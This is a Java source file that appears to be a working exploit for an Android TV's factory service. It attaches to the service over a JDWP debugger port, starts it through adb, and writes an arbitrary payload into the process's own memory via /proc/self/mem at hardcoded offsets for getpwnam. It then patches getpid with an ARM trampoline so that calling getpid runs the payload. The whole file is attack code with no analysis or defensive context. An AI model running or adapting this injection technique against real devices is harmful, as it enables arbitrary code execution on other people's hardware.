import com.sun.jdi.*;
import com.sun.jdi.connect.*;
import com.sun.jdi.event.*;
import com.sun.jdi.request.*;
import java.util.*;
import java.nio.file.*;

public class JdiInject {
    static Method find(ReferenceType t, String n, String s) {
        for (Method m : t.methodsByName(n)) if (m.signature().equals(s)) return m;
        return null;
    }
    static ThreadReference waitBreak(VirtualMachine vm, int timeout) throws Exception {
        EventSet es = vm.eventQueue().remove(timeout);
        if (es == null) return null;
        for (Event ev : es) if (ev instanceof BreakpointEvent) return ((BreakpointEvent) ev).thread();
        return null;
    }
    static void ex(InvocationException ie) {
        System.out.println("EX " + ie.exception().referenceType().name());
        try { Field f=ie.exception().referenceType().fieldByName("detailMessage"); if(f!=null) System.out.println("msg="+ie.exception().getValue(f)); } catch(Throwable x){}
    }
    public static void main(String[] a) throws Exception {
        long base = Long.decode(a[0]);
        byte[] payload = Files.readAllBytes(Paths.get(a[1]));
        long target = base + 0x1f854L;       // getpwnam code start
        long getpid = base + 0x1f488L;      // getpid code start
        byte[] tramp = new byte[8];
        tramp[0] = 0x00; tramp[1] = 0x48;   // ldr r0, [pc, #0]
        tramp[2] = 0x00; tramp[3] = 0x47;   // bx r0
        long t = target | 1;
        for (int i=0;i<4;i++) tramp[4+i] = (byte)((t >> (8*i)) & 0xff);
        System.out.println("base=0x" + Long.toHexString(base) + " payload=" + payload.length + " target=0x" + Long.toHexString(t) + " getpid=0x" + Long.toHexString(getpid));
        AttachingConnector conn = null;
        for (AttachingConnector c : Bootstrap.virtualMachineManager().attachingConnectors())
            if (c.name().equals("com.sun.jdi.SocketAttach")) conn = c;
        Map<String,Connector.Argument> ca = conn.defaultArguments();
        ca.get("hostname").setValue("localhost"); ca.get("port").setValue("8700"); ca.get("timeout").setValue("5000");
        VirtualMachine vm = conn.attach(ca);
        try {
            ReferenceType svc = vm.classesByName("com.cvte.factory.service.MainService").get(0);
            Method on = find(svc, "onStartCommand", "(Landroid/content/Intent;II)I");
            BreakpointRequest bp = vm.eventRequestManager().createBreakpointRequest(on.location());
            bp.setSuspendPolicy(EventRequest.SUSPEND_EVENT_THREAD); bp.enable();
            Thread th = new Thread(() -> { try { Thread.sleep(1200);
                new ProcessBuilder("adb","-s","<TV_IP>:5555","shell","am","startservice",
                    "-n","com.cvte.factory.service/.MainService","-a","cvte.factory.intent.action.APIInit")
                    .inheritIO().start().waitFor(); } catch (Exception e) { e.printStackTrace(); } });
            th.start(); vm.resume();
            ThreadReference thr = waitBreak(vm, 15000);
            if (thr == null) { System.out.println("no breakpoint"); vm.resume(); return; }
            ClassType os = (ClassType)vm.classesByName("android.system.Os").get(0);
            ObjectReference mem = (ObjectReference)os.invokeMethod(thr, find(os,"open","(Ljava/lang/String;II)Ljava/io/FileDescriptor;"),
                Arrays.asList(vm.mirrorOf("/proc/self/mem"), vm.mirrorOf(2), vm.mirrorOf(0)), 0);
            Method pwrite = find(os,"pwrite","(Ljava/io/FileDescriptor;[BIIJ)I");
            ArrayType at = (ArrayType)pwrite.argumentTypes().get(1);
            write(os, thr, pwrite, at, mem, target, payload);
            write(os, thr, pwrite, at, mem, getpid, tramp);
            Method getpidM = find(os, "getpid", "()I");
            try {
                Value pid = os.invokeMethod(thr, getpidM, Collections.emptyList(), 0);
                System.out.println("getpid=" + pid);
            } catch (InvocationException ie) { System.out.println("call"); ex(ie); }
            bp.disable(); vm.resume();
        } finally { try { vm.dispose(); } catch (Throwable e2) {} }
    }
    static void write(ClassType os, ThreadReference thr, Method pwrite, ArrayType at,
                      ObjectReference mem, long addr, byte[] data) throws Exception {
        ArrayReference arr = at.newInstance(data.length);
        List<Value> vals = new ArrayList<>();
        for (byte b : data) vals.add(thr.virtualMachine().mirrorOf(b));
        arr.setValues(vals);
        Value n = os.invokeMethod(thr, pwrite, Arrays.asList((Value)mem,(Value)arr,thr.virtualMachine().mirrorOf(0),thr.virtualMachine().mirrorOf(data.length),thr.virtualMachine().mirrorOf(addr)),0);
        System.out.println("write 0x" + Long.toHexString(addr) + " n=" + n);
    }
}
